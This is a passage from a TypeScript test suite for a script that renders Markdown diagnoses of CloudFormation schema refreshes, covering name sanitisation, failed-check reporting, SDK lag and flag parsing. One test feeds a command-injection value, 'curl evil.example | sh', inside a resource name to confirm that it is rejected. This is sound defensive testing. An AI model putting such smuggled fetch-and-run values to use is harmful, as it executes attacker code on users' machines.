          resourceType: POISON_TYPE,
          client: '@aws-sdk/client-ec2',
          installed: '3.0.0',
          latest: '3.0.0',
          behind: false,
          matched: true,
        },
      ],
    });
    // Every position, both halves. The `resourceType` positions were fed a
    // CLEAN value at first, so three of them could be reverted to raw
    // interpolation individually with the count still 5 — and `resourceType` is
    // the one main() reads straight out of the fixture (`JSON.parse(committed)
    // .resourceType ?? file`), unconstrained.
    //
    // Sites, in render order: the removal's type heading and its property
    // bullet, the rename bullet, the divergence line's type and its key, the
    // writable-added type and its property list, the lag row's type, and the
    // skipped list.
    const rejections = (md.match(/\[(?:name|key) rejected: unexpected characters\]/g) ?? []).length;
    expect(rejections, 'a call site is interpolating a bundle-derived name raw').toBe(12);
    // `renderDetail` strips rather than rejects, so it needs its own witness:
    // the backtick it removes cannot appear in the rendered detail.
    expect(md, 'renderDetail was bypassed at its call site').not.toContain('SDK has `X`');
    expect(md).toContain('SDK has X');
    // And the forged heading never renders as one.
    expect(md).not.toMatch(/^## Nothing in this refresh needs a decision$/m);
  });

  it('keeps a hostile name out of the paste-able shell command', () => {
    // These go inside single quotes in a bash block the runbook tells the
    // maintainer to paste, so a `'` is command injection in their own terminal
    // rather than a broken Markdown span.
    const md = renderDiagnosis({
      removed: [
        {
          resourceType: "AWS::X::Y'; curl evil.example | sh; echo '",
          properties: ["Name'; curl evil.example | sh; echo '"],
          candidates: {},
        },
      ],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).not.toContain('curl evil.example');
    expect(md).toContain('NAME_REJECTED_UNEXPECTED_CHARACTERS');
  });

  it('renderKey admits a real nested path and refuses a span-breaking one', () => {
    expect(renderKey('DistributionConfig.Origins.Items.CustomHeaders')).toBe(
      '`DistributionConfig.Origins.Items.CustomHeaders`'
    );
    expect(renderKey('#top')).toBe('`#top`');
    expect(renderKey('Foo`bar')).toContain('rejected');
    expect(renderKey('Foo [x](https://evil.example)')).toContain('rejected');
  });

  it('renderLiteral admits a real name and refuses a quote', () => {
    expect(renderLiteral('AWS::Glue::Connection')).toBe('AWS::Glue::Connection');
    expect(renderLiteral("a'b")).toBe('NAME_REJECTED_UNEXPECTED_CHARACTERS');
  });

  it('renderDetail strips what could end the line, and keeps the prose', () => {
    expect(renderDetail('SDK has `OAuth2Properties`, but the provider never writes it')).toBe(
      'SDK has OAuth2Properties, but the provider never writes it'
    );
    expect(renderDetail('x\n## Forged')).not.toContain('\n');
  });
});

describe('the failed-checks verdict', () => {
  it('names EVERY failed check, not just the one that was noticed first', () => {
    // A list rather than a flag per check: `property-coverage`'s red was
    // discarded for six rounds, and closing that left `sdk-attr-coverage` and
    // `enrichment-coverage` — both fixture-driven, both CI-blocking, both
    // reddened by a pure schema ADDITION — reporting nothing at all.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      readOnlyAddedCount: 2,
      divergences: [],
      failedChecks: ['audit:sdk-attr-coverage:check', 'audit:enrichment-coverage:check'],
      skipped: [],
    });
    expect(md).not.toContain('additions only');
    expect(md).toContain('audit:sdk-attr-coverage:check');
    expect(md).toContain('audit:enrichment-coverage:check');
    expect(md).toContain('enrichResourceAttributes');
  });

  it('names a check it has no guidance for rather than staying silent', () => {
    // HYPHENATED, deliberately. The first version of this case used
    // `audit:something:check` — the one name in the file with no hyphen — so it
    // passed the wrong guard and could not see that every real check name
    // rendered as the rejection placeholder. A check with no guidance row has
    // nothing else naming it, so it lost its name completely.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      failedChecks: ['audit:some-new-thing:check'],
      skipped: [],
    });
    expect(md).not.toContain('additions only');
    expect(md).toContain('audit:some-new-thing:check');
    expect(md).toContain('no guidance');
    expect(md, 'the heading went through the wrong guard').not.toContain('rejected');
  });

  it('renders every check the table knows, and every one the workflow runs', () => {
    // A CLASS fence, because this is the third round in which a render site
    // rejected the legitimate names it exists to show: fixture filenames, then
    // check names. Driving the REAL name sets means a fourth site cannot be
    // added with the wrong guard and stay green.
    const workflow = readFileSync(
      join(REPO_ROOT, '.github/workflows/cfn-schema-refresh.yml'),
      'utf8'
    );
    const fromWorkflow = [...workflow.matchAll(/^\s*run_check (\S+)/gm)].map((m) => m[1]!);
    const names = [...new Set([...Object.keys(CHECK_GUIDANCE), ...fromWorkflow])];
    expect(names.length, 'no check names found — this case fences nothing').toBeGreaterThanOrEqual(4);
    expect(
      names.some((n) => n.includes('-')),
      'no hyphenated name in the set — the case cannot see the defect it exists for'
    ).toBe(true);
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      failedChecks: names,
      skipped: [],
    });
    expect(md).not.toContain('rejected');
    for (const name of names) expect(md, `${name} is not named`).toContain(name);
  });

  it('never renders "additions only" over a coverage check that FAILED', () => {
    // Its status was discarded by the workflow for six rounds — `|| echo` stops
    // `set -e` aborting and nothing else — so a red check rendered as clean.
    // The trigger is a pure schema ADDITION: the test fails when AWS RE-ADDS a
    // property some provider wrote off in `bogusTolerated`, and 12 such
    // properties across 10 types are one AWS addition away from it.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [{ resourceType: 'AWS::Glue::Crawler', properties: ['LineageConfiguration'] }],
      divergences: [],
      failedChecks: ['property-coverage'],
      skipped: [],
    });
    expect(md).not.toContain('additions only');
    expect(md).toContain('property-coverage');
    expect(md).toContain('bogusTolerated');
    // The property is still listed, but the section says the listing does not
    // cover it — it was previously labelled "no decision needed" and posted to
    // the backfill umbrella as newly unaccounted.
    expect(md).toContain('NOT covered by');
  });

  it('renders the clean verdict when the coverage check passed', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      failedChecks: [],
      skipped: [],
    });
    expect(md).toContain('additions only');
  });
});

describe('fixtures the report could not read', () => {
  it('never renders "additions only" while a fixture went unaccounted', () => {
    // A type that throws during the comparison vanishes from the removal AND
    // the addition accounting, so the residue reads as clean rather than as
    // silent. The other parsers grew shortfall counters in earlier rounds.
    //
    // The FILENAME shape is load-bearing and this case had it wrong: the
    // refresh writes `AWS::Glue::Connection` as `AWS-Glue-Connection.json`, and
    // `renderName`'s class excludes `-`, so the first version of this section
    // put all 134 possible names through the rejection placeholder — while this
    // case fed a name the directory can never hold and passed.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      unreadable: ['AWS-Glue-Connection.json'],
      skipped: [],
    });
    expect(md).not.toContain('additions only');
    expect(md).toContain('could not read');
    expect(md).toContain('AWS::Glue::Connection');
    expect(md, 'the filename went through the guard unconverted').not.toContain('rejected');
  });

  it('renders the real directory’s filenames, not a hand-written shape', () => {
    // Anchored on the actual directory rather than on a literal: a rename in
    // `refresh-cfn-schemas.mjs` would otherwise leave this passing while every
    // rendered name became a placeholder.
    const files = readdirSync(join(REPO_ROOT, 'tests/fixtures/cfn-schemas'))
      .filter((f) => f.endsWith('.json') && !f.startsWith('_'))
      .slice(0, 5);
    expect(files.length, 'no fixtures found — this case checks nothing').toBe(5);
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      unreadable: files,
      skipped: [],
    });
    expect(md).not.toContain('rejected');
    for (const file of files) {
      expect(md).toContain(file.replace(/\.json$/, '').replace(/-/g, '::'));
    }
  });

  it('says nothing about unreadable fixtures when there are none', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      unreadable: [],
      skipped: [],
    });
    expect(md).toContain('additions only');
    expect(md).not.toContain('could not read');
  });
});

describe('the read-only additions section', () => {
  it('does not promise a read-only addition is always a no-op', () => {
    // A new read-only `*Arn`/`*Url` on a type that had none fails
    // `audit:sdk-attr-coverage:check`, and that is reachable ONLY through a
    // read-only addition — so "nothing to do" was a verdict a blocking critic
    // contradicts. 92 of the 134 audited types have no Arn attribute today.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      readOnlyAddedCount: 3,
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('usually nothing to do');
    expect(md).toContain('sdk-attr-coverage');
  });
});

describe('the unparsed-failure verdict', () => {
  it('never renders "additions only" over a checker that said it failed', () => {
    // Both wrong answers shipped: throwing discarded the whole diagnosis,
    // returning [] rendered the refresh as clean. The third answer is a section
    // naming what happened, and the clean verdict suppressed.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [{ resourceType: 'AWS::S3::Bucket', properties: ['NewThing'] }],
      divergences: [],
      nestedKeyUnparsed: true,
      skipped: [],
    });
    expect(md).not.toContain('additions only');
    expect(md).toContain('could not read');
    expect(md).toContain('audit:nested-key-coverage:check');
    // The rest of the report is still rendered — that is the whole point of not
    // throwing.
    expect(md).toContain('NewThing');
  });

  it('renders the clean verdict when the checker did NOT fail', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      nestedKeyUnparsed: false,
      skipped: [],
    });
    expect(md).toContain('additions only');
  });
});

describe('sdkClientVersions', () => {
  it('pairs each client with ITS OWN installed version', () => {
    // The lag question has no member to look up, and asking `sdkModelsMember`
    // with a name that matches nothing answered with the provider's FIRST
    // import — right only by coincidence.
    // `asg-provider.ts`, not a single-client provider: it imports
    // `@aws-sdk/client-auto-scaling` and `@aws-sdk/client-ec2` at DIFFERENT
    // installed versions. With one row in hand a mispairing is unobservable —
    // pinning `version` to `rows[0]`'s left this green against
    // `route53-provider.ts`.
    const rows = sdkClientVersions('src/provisioning/providers/asg-provider.ts', REPO_ROOT);
    expect(rows.length, 'asg-provider no longer imports two clients').toBeGreaterThan(1);
    expect(
      new Set(rows.map((r) => r.version)).size,
      'the two clients now share a version — this case can no longer see a mispairing'
    ).toBeGreaterThan(1);
    for (const { client, version } of rows) {
      expect(client).toMatch(/^@aws-sdk\/client-/);
      const onDisk = JSON.parse(
        readFileSync(join(REPO_ROOT, 'node_modules', client, 'package.json'), 'utf8')
      ).version;
      expect(version, `${client} paired with another client's version`).toBe(onDisk);
    }
  });

  it('returns nothing rather than guessing when the provider is unknown', () => {
    expect(sdkClientVersions(undefined, REPO_ROOT)).toEqual([]);
  });
});

describe('the SDK-lag section', () => {
  const divergence = {
    resourceType: 'AWS::Glue::Connection',
    nestedKey: 'OAuth2Properties.X',
    bucket: 'no-sdk-member',
    detail: '',
  };

  it('scopes every lag row to the type it was computed for', () => {
    // A single line covering "the first divergent type" read as a verdict over
    // divergences it never looked at.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [divergence, { ...divergence, resourceType: 'AWS::ECS::Service' }],
      skipped: [],
      sdkLag: [
        {
          resourceType: 'AWS::Glue::Connection',
          client: '@aws-sdk/client-glue',
          installed: '3.9.0',
          latest: '3.9.0',
          behind: false,
          matched: true,
        },
      ],
    });
    expect(md).toContain('AWS::Glue::Connection');
    expect(md).toContain('ruled out here');
    // The type with NO row must not read as covered by the one that has it.
    expect(md).toContain('UNKNOWN, not ruled out');
  });

  it('keeps the UNKNOWN caveat when EVERY lookup failed', () => {
    // npm unreachable from CI is the ordinary way that happens, and gating the
    // whole block on having rows made the report go silent about SDK lag
    // exactly when it knew least — which reads as ruled out.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [divergence],
      skipped: [],
      sdkLag: [],
    });
    expect(md).toContain('Nothing could be read');
    expect(md).toContain('UNKNOWN, not ruled out');
  });

  it('does not attribute a lag verdict to a client that is not the type’s own', () => {
    // `clientsForType` falls back to every imported client when none matches,
    // so a row can name `@aws-sdk/client-sts` for a Logs divergence. Saying
    // "ruled out here" over it claims something about the wrong service.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [{ ...divergence, resourceType: 'AWS::Logs::LogGroup' }],
      skipped: [],
      sdkLag: [
        {
          resourceType: 'AWS::Logs::LogGroup',
          client: '@aws-sdk/client-sts',
          installed: '3.0.0',
          latest: '3.0.0',
          behind: false,
          matched: false,
        },
      ],
    });
    expect(md).toContain('may not be the type\u2019s own');
    expect(md).not.toContain('ruled out here');
  });

  it('says "here" for a MATCHED client, however it is named', () => {
    // The true positive the previous case could not see. Re-deriving the name
    // test in the renderer made this row read "not the type's own" about
    // `AWS::Events::Rule`'s only client — a live, applicable lag the reader was
    // told to discount.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [{ ...divergence, resourceType: 'AWS::Events::Rule' }],
      skipped: [],
      sdkLag: [
        {
          resourceType: 'AWS::Events::Rule',
          client: '@aws-sdk/client-eventbridge',
          installed: '3.0.0',
          latest: '3.1.0',
          behind: true,
          matched: true,
        },
      ],
    });
    expect(md).toContain('LIVE here');
    expect(md).not.toContain('may not be');
  });

  it('rejects a version string that is not one', () => {
    // The anchor is the whole guard: without `$`, `npm view` output carrying a
    // trailing line would be reported as the published version.
    expect(sdkVersionLag('@aws-sdk/client-glue', '3.9.0', () => '3.9.1')).toEqual({
      installed: '3.9.0',
      latest: '3.9.1',
      behind: true,
    });
    expect(sdkVersionLag('@aws-sdk/client-glue', '3.9.0', () => '3.9.1\nnpm WARN x')).toBeUndefined();
    expect(sdkVersionLag('@aws-sdk/client-glue', '3.9.0', () => 'not-a-version')).toBeUndefined();
  });
});

describe('clientsForType', () => {
  const rows = [
    { client: '@aws-sdk/client-sts', version: '3.0.0' },
    { client: '@aws-sdk/client-glue', version: '3.1.0' },
  ];

  it('drops the clients a provider imports that do not serve the type', () => {
    // Live-observed: a Glue key divergence reported `@aws-sdk/client-sts` as
    // lagging, which is true and says nothing about the finding. Most providers
    // import STS.
    expect(clientsForType('AWS::Glue::Connection', rows)).toEqual([
      { client: '@aws-sdk/client-glue', version: '3.1.0', matched: true },
    ]);
  });

  it('matches a service whose client name carries SEPARATORS the type does not', () => {
    // `@aws-sdk/client-apigatewayv2` was the first pick here and it has no
    // separator, so deleting the separator strip left this green — the
    // fallback-to-every-row arm returned the same single-element array the
    // match arm would have. Two REAL pairs, and a second row that only the
    // match arm can exclude.
    const separated = [
      { client: '@aws-sdk/client-ec2', version: '3.1018.0' },
      { client: '@aws-sdk/client-auto-scaling', version: '3.1045.0' },
    ];
    expect(clientsForType('AWS::AutoScaling::AutoScalingGroup', separated)).toEqual([
      { client: '@aws-sdk/client-auto-scaling', version: '3.1045.0', matched: true },
    ]);
    const route53 = [
      { client: '@aws-sdk/client-sts', version: '3.0.0' },
      { client: '@aws-sdk/client-route-53', version: '3.1.0' },
    ];
    expect(clientsForType('AWS::Route53::HostedZone', route53)).toEqual([
      { client: '@aws-sdk/client-route-53', version: '3.1.0', matched: true },
    ]);
  });

  it('falls back to EVERY row rather than to none when nothing matches', () => {
    // An empty answer renders as an absent type, which the section calls
    // "UNKNOWN, not ruled out" — but silently narrowing to nothing would hide a
    // real lag behind a naming mismatch. Widening is the safe direction.
    const hedged = rows.map((r) => ({ ...r, matched: false }));
    expect(clientsForType('AWS::Made::Up', rows)).toEqual(hedged);
    expect(clientsForType('', rows)).toEqual(hedged);
  });

  it('matches the service name EXACTLY, not by prefix', () => {
    // `startsWith` is equivalent on today's tree — every widening it causes is
    // a single-client provider the next arm settles anyway — so nothing caught
    // it. It bites where a client suffix is a proper superstring of the service
    // segment, and then the renderer says "here" about the wrong client.
    const rows = [
      { client: '@aws-sdk/client-s3-control', version: '3.1.0' },
      { client: '@aws-sdk/client-sts', version: '3.0.0' },
    ];
    expect(clientsForType('AWS::S3::Bucket', rows).every((r) => !r.matched)).toBe(true);
  });

  it('does not settle a single client against a type name that did not parse', () => {
    // The arm reasons "one client, nothing to disambiguate" — which is only
    // true once there IS a service to disambiguate against.
    const one = [{ client: '@aws-sdk/client-eventbridge', version: '3.1.0' }];
    expect(clientsForType('', one)).toEqual([
      { client: '@aws-sdk/client-eventbridge', version: '3.1.0', matched: false },
    ]);
  });

  it('settles a SINGLE-client provider even when the name test cannot', () => {
    // The name test is a heuristic, and reading its failure as "wrong client"
    // was a regression: 13 of the 134 registered types are served by a client
    // not named after their service segment, and telling the reader to discount
    // a live, applicable lag is the confident-wrong-answer direction. With one
    // client there is nothing to disambiguate.
    const one = [{ client: '@aws-sdk/client-eventbridge', version: '3.1.0' }];
    expect(clientsForType('AWS::Events::Rule', one)).toEqual([
      { client: '@aws-sdk/client-eventbridge', version: '3.1.0', matched: true },
    ]);
  });

  it('hedges only where the provider really is ambiguous', () => {
    // Measured over the real tree: name test 119, single-client arm 10,
    // genuinely ambiguous 3 — a provider importing several clients, none named
    // for the service. `AWS::Logs::LogGroup` is one of the three.
    const ambiguous = [
      { client: '@aws-sdk/client-cloudwatch-logs', version: '3.1.0' },
      { client: '@aws-sdk/client-sts', version: '3.0.0' },
    ];
    expect(clientsForType('AWS::Logs::LogGroup', ambiguous).every((r) => !r.matched)).toBe(true);
  });

  it('agrees with the real tree: at most a handful of types stay ambiguous', () => {
    // A floor AND a ceiling. Zero hedged rows would mean the flag stopped
    // discriminating; a large number would mean the name test broke.
    const map = mapTypesToProviderFiles(
      readFileSync(join(REPO_ROOT, 'src/provisioning/register-providers.ts'), 'utf8')
    );
    let hedged = 0;
    let settled = 0;
    for (const [type, file] of map) {
      const rows = sdkClientVersions(file, REPO_ROOT);
      if (rows.length === 0) continue;
      if (clientsForType(type, rows)[0]!.matched) settled++;
      else hedged++;
    }
    // BOTH bounds are on `hedged`, and that is the correction: every type with
    // a client increments exactly one counter, so `settled + hedged` is a
    // constant and `settled > 100` could never be the failing assertion —
    // `hedged <= 6` already implies it. The floor the old comment promised was
    // asserted by neither line, and `matched: true` unconditionally gave
    // {settled: 132, hedged: 0} while passing both.
    expect(settled + hedged, 'no type reached a client at all').toBeGreaterThan(100);
    expect(hedged, 'more types went ambiguous than the measurement found').toBeLessThanOrEqual(6);
    expect(hedged, 'nothing hedges any more — the flag stopped discriminating').toBeGreaterThan(0);
  });
});

describe('buildSdkLag', () => {
  const glue = { resourceType: 'AWS::Glue::Connection', bucket: 'no-sdk-member' };
  const clientsFor = () => [
    { client: '@aws-sdk/client-sts', version: '3.0.0' },
    { client: '@aws-sdk/client-glue', version: '3.1.0' },
  ];
  const lag = (client: string, installed: string) => ({
    installed,
    latest: '9.9.9',
    behind: true,
  });

  it('narrows to the type’s own client, so an unrelated import is not reported', () => {
    expect(buildSdkLag([glue], clientsFor, lag)).toEqual([
      {
        resourceType: 'AWS::Glue::Connection',
        client: '@aws-sdk/client-glue',
        // Carried through, never re-derived downstream: two sites computing the
        // same predicate is how the renderer came to disagree with the narrower.
        matched: true,
        installed: '3.1.0',
        latest: '9.9.9',
        behind: true,
      },
    ]);
  });

  it('carries a HEDGED flag through, so the renderer never has to re-derive it', () => {
    const ambiguous = () => [
      { client: '@aws-sdk/client-cloudwatch-logs', version: '3.1.0' },
      { client: '@aws-sdk/client-sts', version: '3.0.0' },
    ];
    const rows = buildSdkLag(
      [{ resourceType: 'AWS::Logs::LogGroup', bucket: 'no-sdk-member' }],
      ambiguous,
      lag
    );
    expect(rows.length).toBe(2);
    expect(rows.every((r) => r.matched === false)).toBe(true);
  });

  it('emits ONE row per (type, client) however many divergences land on it', () => {
    // Several divergences on one type is the ordinary case, and a repeated row
    // reads as several findings.
    expect(buildSdkLag([glue, glue, glue], clientsFor, lag)).toHaveLength(1);
  });

  it('asks each client at most once', () => {
    const asked: string[] = [];
    buildSdkLag(
      [glue, { resourceType: 'AWS::Glue::Crawler', bucket: 'no-sdk-member' }],
      clientsFor,
      (client, installed) => {
        asked.push(client);
        return { installed, latest: '9.9.9', behind: true };
      }
    );
    // `npm view` is a network call; two types sharing a client must not pay twice.
    expect(asked).toEqual(['@aws-sdk/client-glue']);
  });

  it('never asks anything for a case-divergence', () => {
    const asked: string[] = [];
    const rows = buildSdkLag(
      [{ resourceType: 'AWS::ECS::Service', bucket: 'case-divergence' }],
      clientsFor,
      (client, installed) => {
        asked.push(client);
        return { installed, latest: '9.9.9', behind: true };
      }
    );
    // There is no judgement in a case divergence, so it justifies no lookup.
    expect(asked).toEqual([]);
    expect(rows).toEqual([]);
  });

  it('drops a client whose lag could not be read, rather than inventing a row', () => {
    expect(buildSdkLag([glue], clientsFor, () => undefined)).toEqual([]);
  });
});

describe('the script end to end', () => {
  // `main()` had no coverage at all, and the two defects review found in the
  // lag path were both reachable only through it. These spawn the real binary
  // against the real repo. Neither log carries a non-case divergence, so no
  // `npm view` runs and the cases stay offline.
  const SCRIPT = join(REPO_ROOT, 'scripts/diagnose-schema-refresh.mjs');
  const run = (log: string, rc?: string, extra: string[] = []): string => {
    const dir = mkdtempSync(join(tmpdir(), 'cdkd-diagnose-'));
    try {
      const path = join(dir, 'nested-key.log');
      writeFileSync(path, log);
      const args = [SCRIPT, '--nested-key-log', path];
      if (rc !== undefined) args.push('--nested-key-rc', rc);
      args.push(...extra);
      return execFileSync('node', args, { encoding: 'utf8' });
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  };

  it('reports a clean refresh as clean', () => {
    const md = run('nested-key-coverage: OK — 0 divergences\n');
    expect(md).toContain('Nothing in this refresh needs a decision');
  }, 60_000);

  it('carries an unreadable checker failure all the way to the body', () => {
    // The wiring from `parseNestedKeyDivergences`'s flag to the rendered
    // section is one line in main(), and it was the sole production path of the
    // whole feature.
    const md = run(
      'nested-key-coverage: FAIL — stale NESTED_KEY_ALLOW_LIST entr(ies) match no audited key\n'
    );
    expect(md).toContain('could not read');
    expect(md).not.toContain('Nothing in this refresh needs a decision — additions only');
  }, 60_000);

  it('treats an UNREADABLE exit code as a failure, not as success', () => {
    // Both arms of the flag reader used to return 0 — "the checker succeeded" —
    // so a mistyped value silently restored the behaviour where a checker that
    // never ran renders as "additions only".
    for (const unreadable of ['not-a-number', '', ' ']) {
      expect(run('', unreadable), `read as success: ${JSON.stringify(unreadable)}`).toContain(
        'could not read'
      );
    }
    // The ABSENT flag stays 0 on purpose: this script is also run by hand, and
    // refusing every manual invocation is not a safety property. The workflow
    // dropping the flag is guarded in the workflow test instead.
    expect(run('')).toContain('Nothing in this refresh needs a decision');
  }, 60_000);

  it('carries --failed-checks from the command line into the body', () => {
    // The workflow test pins the shell that PASSES the list and the renderer
    // tests hand-feed it; nothing joined them, so `main()` could discard the
    // list and render "additions only" over a red check — the exact defect
    // eight rounds went into finding. The sibling `--nested-key-rc` had this
    // case; the twin was never written.
    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--failed-checks',
      'property-coverage,audit:sdk-attr-coverage:check',
    ]);
    expect(md).not.toContain('Nothing in this refresh needs a decision');
    expect(md).toContain('property-coverage');
    expect(md).toContain('audit:sdk-attr-coverage:check');
  }, 60_000);

  it('treats an EMPTY --failed-checks as nothing failed', () => {
    // The list is empty on every green cycle, so this is the ordinary path and
    // it must not render a decision section.
    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--failed-checks',
      '',
    ]);
    expect(md).toContain('Nothing in this refresh needs a decision');
  }, 60_000);

  it('refuses a --failed-checks given with NO value', () => {
    // Present-with-no-value is unreadable, not empty, and empty reads as
    // "nothing failed" — the same distinction `--nested-key-rc` needed. The
    // script still exits 0 (a diagnosis must not take down the PR it
    // describes), so the refusal has to be visible in the body.
    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, ['--failed-checks']);
    expect(md).not.toContain('Nothing in this refresh needs a decision');
    // The MESSAGE, not just the outcome: without the explicit refusal the
    // `undefined` reaches `.split(',')` and throws a TypeError, which the outer
    // handler renders as the same generic failure — so asserting "failed to
    // run" alone could not tell the deliberate refusal from the accident, and
    // the maintainer would read `Cannot read properties of undefined`.
    expect(md).toContain('--failed-checks was given with no value');
  }, 60_000);

  it('refuses a log path that does not exist', () => {
    // The third arg reader was the last one still silent on both counts. A
    // missing `--skipped-log` returned `''`, the section is omitted when empty,
    // and an unread log is then byte-identical to "everything was refreshed" —
    // with no companion status flag to rescue it, unlike `--nested-key-log`.
    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--skipped-log',
      '/no/such/path.log',
    ]);
    expect(md).toContain('which does not exist');
    expect(md).not.toContain('Nothing in this refresh needs a decision');
  }, 60_000);

  it('refuses a flag consumed as another flag’s value', () => {
    // `undefined` is only the TRAILING spelling of "no value". A following FLAG
    // is the same mistake and was read as the value: this fabricated a failed
    // check literally named `--skipped-log`, rendered with "no guidance".
    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--failed-checks',
      '--skipped-log',
      '/dev/null',
    ]);
    expect(md).toContain('--failed-checks was given with no value');
    expect(md).not.toContain('no guidance');
  }, 60_000);

  it('reads the --flag=value spelling too, in every reader', () => {
    // `args.indexOf(flag)` returns -1 for the glued form, so a mistyped
    // invocation fell through to each reader's ABSENT arm: `''` for the log
    // readers and 0 — "the checker succeeded" — for the status one. Only the
    // workflow's space form held it shut, and the fence for that accepted
    // `--skipped-log=...` as well.
    // All THREE readers, each through its own flag — the title said "every
    // reader" while only `readArgValue` was exercised, so a per-reader
    // regression would have passed.
    const list = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--failed-checks=property-coverage',
    ]);
    expect(list).toContain('property-coverage');
    expect(list).not.toContain('Nothing in this refresh needs a decision');

    // `readNumArg`: a non-zero status with nothing parsed is a failure.
    const status = run('', undefined, ['--nested-key-rc=2']);
    expect(status).toContain('could not read');

    // `readArg`: a path that does not exist is refused, not read as empty.
    const path = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--skipped-log=/no/such/path.log',
    ]);
    expect(path).toContain('which does not exist');
  }, 60_000);

  it('refuses a SINGLE-dash token where a value was expected', () => {
    // The guard covered `--x` only, while the workflow comment eight lines from
    // it warns about exactly the single-dash spelling (`-props`). This
    // fabricated a failed check rendered as `#### \`-property-coverage\``.
    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--failed-checks',
      '-property-coverage',
    ]);
    // Refused — by the unknown-flag guard, which sees the token first and names
    // it. Before either guard existed this fabricated a check rendered as
    // `#### \`-property-coverage\``.
    expect(md).toContain('unrecognized flag');
    expect(md).not.toContain('#### ');
  }, 60_000);

  it('refuses a dash-leading value in the GLUED spelling too', () => {
    // The glued branch returned before the dash test, so
    // `--failed-checks=-property-coverage` fabricated exactly the check the
    // space-form guard was written to kill. Both spellings were added to the
    // same function in the same round and never crossed; the case that came
    // with them covered glued-clean and space-dash, never glued-dash.
    for (const spelling of ['--failed-checks=-property-coverage', '--failed-checks=--skipped-log']) {
      const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [spelling]);
      expect(md, `accepted ${spelling}`).toContain('was given with no value');
      expect(md).not.toContain('no guidance');
    }
    // The SPACE form now trips the unknown-flag guard first, which is the
    // stronger refusal — it names the offending token rather than the flag
    // that swallowed it. Either refusal is correct; neither may render clean.
    const spaced = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--failed-checks',
      '-property-coverage',
    ]);
    expect(spaced).toContain('unrecognized flag');
    expect(spaced).not.toContain('no guidance');
  }, 60_000);

  it('does not answer a check name inherited from Object.prototype', () => {
    // A plain object literal answers for `constructor` / `toString` /
    // `valueOf` with a FUNCTION, which the spread cannot iterate — collapsing
    // the whole diagnosis to the generic failure line instead of rendering an
    // unknown check.
    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--failed-checks',
      'constructor',
    ]);
    expect(md).toContain('constructor');
    expect(md).toContain('no guidance');
    expect(md).not.toContain('failed to run');
  }, 60_000);

  it('renders the "Not refreshed" section from a POPULATED skipped log', () => {
    // Every other `--skipped-log` case is a refusal or `/dev/null`, so the
    // parse turning the refresh log's tail into that section had no coverage:
    // replacing its `^AWS::` filter with "any non-empty line" left all cases
    // green.
    const dir = mkdtempSync(join(tmpdir(), 'cdkd-skipped-'));
    try {
      const log = join(dir, 'skipped.log');
      writeFileSync(
        log,
        [
          'No entry in the public bundle for these registered types:',
          '  AWS::BedrockAgentCore::Browser',
          '  AWS::BedrockAgentCore::CodeInterpreter',
          'some trailing prose',
        ].join('\n')
      );
      const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
        '--skipped-log',
        log,
      ]);
      expect(md).toContain('Not refreshed');
      // Asserted against the BULLET lines only: the section's own prose
      // legitimately contains the log header's wording, so a whole-body
      // `not.toContain` fails on correct output.
      const bullets = md
        .split('\n')
        .filter((l) => l.startsWith('- '))
        .join('\n');
      // The EXACT bullet set. A `not.toContain('No entry')` does not
      // discriminate: `renderName` rejects a line with spaces, so a loosened
      // filter renders the header and the prose as
      // `**[name rejected: unexpected characters]**` and the header's words
      // never appear. The guard masks the parse it sits downstream of.
      expect(bullets.split('\n')).toEqual([
        '- `AWS::BedrockAgentCore::Browser`',
        '- `AWS::BedrockAgentCore::CodeInterpreter`',
      ]);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }, 60_000);

  it('refuses a log path that is a DIRECTORY, naming the cause', () => {
    // It passes `existsSync` and throws `EISDIR` inside `readFileSync`, which
    // collapsed the whole report to the generic one-line failure. Every other
    // refusal here names what was wrong.
    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--skipped-log',
      tmpdir(),
    ]);
    expect(md).toContain('which is a directory');
  }, 60_000);

  it('refuses an unrecognised flag instead of rendering a clean verdict', () => {
    // Every reader's absent-flag arm is the permissive one, so a typo, a
    // retired flag and a single-dash spelling all rendered as clean.
    // A dash-LESS token too: the first guard tested `startsWith('-')`, so
    // `failed-checks property-coverage` — one spelling over from
    // `-failed-checks` — fell through to the permissive arms and rendered the
    // clean verdict. This script takes no positionals at all.
    for (const bad of [
      '--property-coverage-rc',
      '--failed-check',
      '-failed-checks',
      'failed-checks',
    ]) {
      const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [bad, 'x']);
      expect(md, `accepted ${bad}`).toContain('unrecognized flag');
      expect(md).not.toContain('Nothing in this refresh needs a decision');
    }
  }, 60_000);

